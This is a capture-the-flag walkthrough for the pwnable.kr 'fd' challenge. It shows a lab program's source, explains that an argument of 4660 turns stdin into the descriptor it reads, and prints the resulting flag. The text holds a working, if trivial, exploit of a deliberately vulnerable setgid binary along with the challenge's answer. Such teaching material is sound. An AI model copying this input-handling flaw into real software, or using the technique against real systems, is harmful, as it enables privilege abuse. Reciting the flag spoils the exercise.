# fd — pwnable.kr

## Goal
get the flag

---
## Files Provided
* `fd`
* `fd.c` — `fd`s source
* `flag` — the goal
---
## Walkthrough

```commandline
fd@ubuntu:~$ ls -l
total 24
-r-xr-sr-x 1 root fd_pwn 15148 Mar 26 13:17 fd
-rw-r--r-- 1 root root     452 Mar 26 13:17 fd.c
-r--r----- 1 root fd_pwn    50 Apr  1 06:06 flag
```
Trying to read flag is obviously a no go:
```commandline
fd@ubuntu:~$ cat flag
cat: flag: Permission denied
```
But we can read `fd.c`,
and `fd` (`fd.c` compiled) can access `flag`!

```commandline
fd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
We can see that if `read`ing the `fd` returns "LETMEWIN\n"
the flag is shown!

There is one fd that we can easily control which is 0
(STDIN)
if the chosen fd will be 0 we can just type LETMEWIN and win!

The fd is the arg given - 0x1234
which is 4660.
so by passing 
```commandline
fd@ubuntu:~$ ./fd 4660
```
we can type:
```commandline
LETMEWIN
```
and get the output:
```commandline
good job :)
Mama! Now_I_understand_what_file_descriptors_are!
```
